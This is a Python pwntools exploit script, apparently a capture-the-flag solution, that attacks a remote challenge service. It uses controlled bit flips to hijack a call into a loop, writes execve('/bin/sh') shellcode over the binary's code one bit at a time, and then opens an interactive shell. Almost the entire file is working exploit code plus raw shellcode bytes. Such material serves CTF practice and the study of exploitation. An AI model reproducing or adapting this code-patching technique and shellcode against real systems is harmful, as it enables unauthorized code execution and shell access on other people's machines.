
from pwn import *

context(arch = 'amd64', os = 'linux')

# find a bit flip that allows us to loop for more bit flips
def find():
	
	# hijack one of the call or jump executed after bit flip
	call_addr = 0x00400713
	call_rel = 0xFFFFFE08
	call_off = 5
	max_bit = 32
	#jmp_addr = 0x0040072A
	#jmp_rel = 0x05
	#jmp_off = 1
	#max_bit = 8
	
	# code intervals that go back to main
	wanted_targets = [0x400540, 0x400564, 0x400500, 0x400500, 0x400636, 0x400732]

	for i in range(max_bit):
		for j in range(0, len(wanted_targets), 2):
			# test where the modified instruction will go
			call_rel = call_rel ^ (0x01 << i)
			where = (call_addr + call_rel + call_off) % 2**32
			if where >= wanted_targets[j] and where <= wanted_targets[j+1]:
				print("great success!")
				print("address:", hex(where))
				print("bit:", i)
				print("modfied relative:", hex(call_rel))
			call_rel = call_rel ^ (0x01 << i)
			print("target:", hex(where))

def exploit():
    #r = process('./bit_a953161d37f64d58ce4ffce843d30ad9')
    
    # DEBUG
    #gdb.attach(r)   # attach gdb to process
    #print("press start when ready")
    #raw_input()   # wait for us setting up gdb breakpoints
    
    r = remote('flatearth.fluxfingers.net', 1744)

	# code binary where the shellcode will be placed
    data      = "\xb8\x00\x00\x00\x00H\x8bu\xf8dH34%(\x00\x00\x00t\x05\xe8\xbf\xfd\xff\xff\xc9\xc3f.\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x00AWAVAUATUSH\x81\xec(\x10\x00\x00H\x83\x0c$\x00H\x81\xc4 \x10\x00\x00L\x8d%L\x06 \x00H\x8d-M\x06 \x001\xdbA\x89\xffI\x89\xf6I\x89\xd5L)\xe5H\xc1\xfd\x03\xe86\xfd\xff\xffH\x85\xedt\x1ff\x0f\x1f\x84\x00\x00\x00\x00\x00L\x89\xeaL\x89\xf6D\x89\xffA\xff\x14\xdcH\x83\xc3\x01H9\xebu\xeaH\x83\xc4\x08[]A\\A]A^A_\xc3\x90f.\x0f\x1f\x84\x00\x00\x00\x00\x00\xf3\xc3\x00\x00H\x83\xec\x08H\x83\xc4\x08\xc3\x00\x00\x00\x01\x00\x02\x00%lx:%u\x00\x00\x01\x1b\x03;0\x00\x00\x00\x05\x00\x00\x00\x04\xfd\xff\xff|\x00\x00\x00d\xfd\xff\xffL\x00\x00\x00Z\xfe\xff\xff\xa4\x00\x00\x00d\xff\xff\xff\xc4\x00\x00\x00\xe4\xff\xff\xff\x0c\x01\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01zR\x00\x01x\x10\x01\x1b\x0c\x07\x08\x90\x01\x07\x10\x14\x00\x00\x00\x1c\x00\x00\x00\x10\xfd\xff\xff*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01zR\x00\x01x\x10\x01\x1b\x0c\x07\x08\x90\x01\x00\x00$\x00\x00\x00\x1c\x00\x00\x00\x80\xfc\xff\xff`\x00\x00\x00\x00\x0e\x10F\x0e\x18J\x0f\x0bw\x08\x80\x00?\x1a;*3$\"\x00\x00\x00\x00\x1c\x00\x00\x00D\x00\x00\x00\xae\xfd\xff\xff\xfd\x00\x00\x00\x00A\x0e\x10\x86\x02C\r\x06\x02\xf8\x0c\x07\x08\x00\x00D\x00\x00\x00d\x00\x00\x00\x98\xfe\xff\xffu\x00\x00\x00\x00B\x0e\x10\x8f\x02B\x0e\x18\x8e\x03B\x0e \x8d\x04B\x0e(\x8c\x05A\x0e0\x86\x06A\x0e8\x83\x07S\x0e@\x02M\x0e8A\x0e0A\x0e(B\x0e B\x0e\x18B\x0e\x10B\x0e\x08\x14\x00\x00\x00\xac\x00\x00\x00\xd0\xfe\xff\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    # payload to get us shell
    shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

	# making sure data > shellcode
    print(len(shellcode))
    print(len(data))

	# calculate the addresses and bit offsets necessary to put the shellcode into memory
    current_address = 0x400718
    addresses = []
    bits = []
    bo = 0 # byte offset
    bit = 0 # bit index

    for i in range(len(shellcode)) * 8:
        mask = 1 << bit

        if (ord(shellcode[bo]) ^ ord(data[bo])) & mask:
            addresses.append(current_address)
            bits.append(bit)

        if bit == 7:
            bo += 1
            current_address += 1

        bit = (bit + 1) % 8

	# enable loop into bit flips
    r.sendline("0x400714:5")

	# place the shellcode into memory
    for i in range(len(addresses)):
        e = hex(addresses[i]) + ":" + str(bits[i])
        print(e)
        r.sendline(e)

    # disable loop and execution falls into shellcode
    r.sendline("0x400714:5")
    
    # cat flag
    r.interactive()

#find()
exploit()


# gdb used commands
#b *0x400713
#0x400714:5
#0x400586:1  # modifies mov eax,0x0
